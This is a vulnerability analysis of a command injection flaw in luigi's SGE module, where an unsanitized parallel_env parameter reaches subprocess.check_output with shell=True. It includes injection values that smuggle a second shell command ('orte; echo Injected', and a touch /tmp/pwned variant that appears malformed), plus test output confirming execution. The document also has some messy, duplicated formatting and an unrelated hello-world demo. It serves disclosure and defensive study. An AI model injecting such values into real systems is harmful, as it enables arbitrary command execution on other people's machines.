# Luigi SGE Command Injection Analysis

## Package Information

| Field      | Value                            |
| ---------- | -------------------------------- |
| Package    | luigi                            |
| PyPI       | https://pypi.org/project/luigi/  |
| GitHub     | https://github.com/spotify/luigi |
| Maintainer | Spotify                          |
| File       | `luigi/contrib/sge.py`           |

---

## Summary

Found a potential command injection vulnerability in luigi's SGE module. User-controlled parameters are passed to `subprocess.check_output()` with `shell=True` and no sanitization.

---

## Source (User Input)
```python
parallel_env = luigi.Parameter(default='orte', significant=False)
```

`luigi.Parameter()` allows users to set this via:
- Config file (`luigi.cfg`)
- Command line
- Code

---

## Sink (Dangerous Function)
```python
output = subprocess.check_output(submit_cmd, shell=True)
```

---

## Static Analysis (Vulnerable Code Flow)

### Step 1: User sets parameter
```python
parallel_env = 'orte"; touch /tmp/pwned #'
```

### Step 2: Parameter passed to command builder
```python
submit_cmd = _build_qsub_command(
    job_str, 
    self.task_family, 
    self.outfile,
    self.errfile, 
    self.parallel_env,  # <-- User input
    self.n_cpu
)
```

### Step 3: Command built with no sanitization
```python
def _build_qsub_command(cmd, job_name, outfile, errfile, pe, n_cpu):
    qsub_template = """echo {cmd} | qsub -o ":{outfile}" -e ":{errfile}" -V -r y -pe {pe} {n_cpu} -N {job_name}"""
    return qsub_template.format(
        cmd=cmd, 
        job_name=job_name, 
        outfile=outfile, 
        errfile=errfile,
        pe=pe,  # <-- Inserted directly, no sanitization
        n_cpu=n_cpu
    )
```

### Step 4: Command executed with shell=True
```python
output = subprocess.check_output(submit_cmd, shell=True)
```

### Dynamic Analysis

```python
import luigi  
  
class MyTask(luigi.Task):  
   name = luigi.Parameter(default='world')  
  
   def output(self):  
       return luigi.LocalTarget(f'/tmp/hello_{self.name}.txt')  
  
   def run(self):  
       with self.output().open('w') as f:  
           f.write(f'Hello, {self.name}!\n')  
  
if __name__ == '__main__':  
   luigi.build([MyTask()], local_scheduler=True)
```


```
python test_luigi.py MyTask --name Marcos
```

- `name` = `'Marcos'` (from command line)
- Creates `/tmp/hello_Marcos.txt`
- File contains: `Hello, Marcos!`
- 
- ## Visual Flow
```python
python test_luigi.py MyTask --name Marcos 
```
```
- `name` = `'Marcos'` (from command line) 
- Creates `/tmp/hello_Marcos.txt` 
- File contains: `Hello, Marcos!` 

┌─────────────────────────────┐
│ name = luigi.Parameter()    │ ← User sets via CLI or config
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ output() → /tmp/hello_X.txt │ ← Where to save
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ run() → Write "Hello, X!"   │ ← Does the work
└─────────────────────────────┘
```

---  
  
# # Subprocess Behavior Validation

Before testing Luigi's SGE integration directly, subprocess behavior was validated in isolation to confirm how `shell=True` interprets input and metacharacters.

---

## 1. Basic Command Execution

Confirm that `subprocess` executes commands correctly with `shell=True`.

python

```python
import subprocess

output = subprocess.check_output("echo hello", shell=True)
print(output.decode())
```

**Output:**

```
hello
```

---

## 2. Metacharacter Interpretation

Verify that shell metacharacters (`;`) are interpreted, allowing multiple commands to chain in a single string.

python

```python
import subprocess

output = subprocess.check_output("echo hello; echo injected", shell=True)
print(output.decode())
```

**Output:**

```
hello
injected
```

> Both commands executed — confirming that `shell=True` passes the string directly to `/bin/sh`, which interprets `;` as a command separator.

---

## 3. Simulated Injection via Luigi-Style Code Structure

Using the same pattern as Luigi's SGE task runner, a malicious value is injected into the `-pe` (parallel environment) argument to test whether it breaks out of the intended command.

python

```python
import subprocess

pe = 'orte; echo Injected'

cmd = f"echo job | qsub -pe {pe} 4"
print(cmd)

subprocess.check_output(cmd, shell=True)
```

**Constructed command:**

```
echo job | qsub -pe orte; echo Injected 4
```

**Output:**

```
/bin/sh: 1: qsub: not found
Injected 4
```

> The injected `echo Injected` ran successfully as a separate shell command. Even though `qsub` was not found, the shell continued past the `;` and executed the injected payload — demonstrating a **command injection vulnerability** when unsanitized input is passed to `subprocess` with `shell=True`.